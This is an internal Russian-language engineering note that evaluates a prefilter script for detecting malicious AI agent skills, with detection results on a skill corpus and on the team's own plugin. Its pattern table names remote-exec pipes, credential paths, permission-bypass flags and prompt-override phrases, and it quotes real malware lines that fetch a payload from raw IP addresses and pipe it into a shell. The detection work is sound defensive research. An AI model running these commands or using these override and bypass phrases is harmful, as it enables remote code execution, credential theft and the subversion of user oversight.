# Прототип `skill_prescan.py`: замер на корпусе Semia и на нашем `boost`

- **Что:** наш stdlib-скрипт (`items/skill_prescan.py`, ~200 строк),
  детерминированный префильтр перед ручным разбором. Код и шаблоны
  свои; из Semia взяты идеи (класс `unresolved_target`, «канал наружу»,
  опись пропускаемых папок как находка).
- **Вердикт:** **адаптировать** — как первый шаг чек-листа и как
  проверку перед публикацией плагина. Не как единственная проверка.

## Что проверяет

| Класс | Уровень | Примеры шаблонов |
|---|---|---|
| `remote-exec` | BLOCK | `curl … \| sh`, `base64 -d \| bash`, `eval "$(curl`, `iex` |
| `unresolved-target` | BLOCK | URL с голым IP; glot.io, pastebin, ngrok, webhook.site, transfer.sh |
| `social-engineering` | BLOCK/HIGH | zip/7z + пароль; «скачай .exe/.zip»; «скопируй в терминал»; «must be installed before using» |
| `exfil-channel` | HIGH | вебхуки Discord/Slack, Telegram Bot API |
| `secret-access` | HIGH/REVIEW | `~/.ssh`, `~/.aws`, `id_rsa`, Keychain, профиль браузера (`--browser real`); `printenv`, `os.environ` |
| `permission-bypass` | HIGH/REVIEW | `bypassPermissions`, `--dangerously-skip-permissions`, `allowed-tools: Bash` без ограничения |
| `instruction-override` | HIGH | «ignore previous instructions», «don't tell the user», «without asking», рус. варианты; цитаты и отрицания понижаются до REVIEW |
| `hidden-text` | HIGH/REVIEW | zero-width/bidi/tag-символы; длинные HTML-комментарии в `.md` |
| `encoded-blob` | REVIEW | base64 ≥ 40 символов декодируется и **сканируется повторно** |
| `obfuscation` | HIGH | длинные `\x..`, `String.fromCharCode(…)`, цепочки `chr()` |
| `opaque-binary` | HIGH | `.pyz`, `.exe`, `.so`, архивы, `.whl` |
| `install-hook` | HIGH | `package.json` с `(pre|post)install` |
| `supply-chain`, `telemetry`, `broad-trigger`, `inventory` | REVIEW | `@latest`, `npx -y`, `pip install` без `==`, `sudo`, `git clone` без SHA; posthog/sentry; «always/proactively» в `description`; файлы в `dist/`/`build/`/`vendor/` |

Плюс отдельные списки: **поверхности исполнения без вызова скилла**
(`hooks/hooks.json`, `settings.json`, `.mcp.json`, манифесты,
`package.json`, установщики), **все внешние хосты**, **что не прочитано**.
Код выхода: 2 — BLOCK, 1 — HIGH, 0 — иначе.

## Замер 1: корпус Semia (`tests/fixtures/skills@379bc25`, 52 папки со `SKILL.md`)

Разметка наша, по чтению срабатываний и `SKILL.md`, не экспертная.
«Вредонос» — скиллы кампании ClawHub (zip с паролем из GitHub releases,
glot.io, `echo '<base64>' | base64 -D | bash` → `curl http://91.92.242.30/…`)
и бэкдор `os.system("curl -s http://54.91.154.110:13338/|sh")`.

| | Прогон 1 | Прогон 3 (после правок) |
|---|---|---|
| Вредоносы (21) → BLOCK | 20 | 20 |
| Вредоносы → HIGH | 0 (1 пропуск: `thiagoruss0/pptx-creatord`) | 1 |
| Остальные (31) → BLOCK | 1 (`deadclaw`: Telegram API) | 0 |
| Остальные → HIGH | 4 | 6 |
| Остальные → чисто/REVIEW | 26 | 25 |

Из 6 HIGH у «остальных» по делу 3: `email-daily-summary` (реальный
профиль Chrome со всеми логинами — это пример из `EXAMPLE.md` самого
Semia), `claude-connect` (Keychain с токенами Claude), `deadclaw`
(отправка в Telegram). Ложные 3: сканеры инъекций, которые цитируют
шаблоны без кавычек (`wolffan`, `kgeesawor`), и «Before using this skill,
you must configure…» (`ryot`).

**Оговорки.** Правила подстроены на этом же корпусе между прогонами
(переобучение). Кампания однородна (один шаблон), recall на новых
кампаниях неизвестен. Семантику («скилл читает почту и отдаёт её
внешнему LLM») греп не видит: `email-daily-summary` пойман только по
флагу браузера, а не по потоку данных.

## Замер 2: наш `plugins/boost` перед публикацией

354 файла. Прогон 1: 1 BLOCK + 4 HIGH — **все ложные**: наш собственный
README перечисляет запрещённое («Никаких `curl | bash`»), а скиллы
говорят «не выполняй без подтверждения». После учёта отрицаний (рус. и
англ.) — 0 BLOCK, 1 HIGH в `evals/…/graders/gate.md` (в маркетплейс
`evals/` не уходит). Полезное: список поверхностей исполнения сразу
показал `hooks/hooks.json` (хуки `cloud-memory`) и фикстуры с
`.mcp.json` и `.claude/settings.json` в `evals/` — их надо явно исключать
при переносе.

## Вывод

- **BLOCK работает как стоп-кран** для грубого вредоноса: 20/21 без
  единого ложного BLOCK после правок. Это 0 токенов и секунды.
- **HIGH = «прочитай глазами»**, не вердикт: половина HIGH на чужих
  скиллах — ложные. Для текстов о безопасности (сканеры, наши правила)
  греп путает «говорит об атаке» и «атакует».
- Скрипт не заменяет п. 2–3 чек-листа (поток данных, ворота): это и есть
  та часть, где нужен разбор моделью или человеком.

## Что ещё сделать до включения в `boost`

- Выделить `references/patterns.md` (значения отдельно от метода, №29).
- Флаг `--exclude evals` для проверки перед публикацией.
- Eval по `plugins/boost/evals/README.md`: 3–4 подложенных «вредных»
  скилла (инъекция в тексте, хук с сетью, `postinstall`, вредонос в
  `dist/`) + чистый; A/B «чек-лист с прескрипом / без».
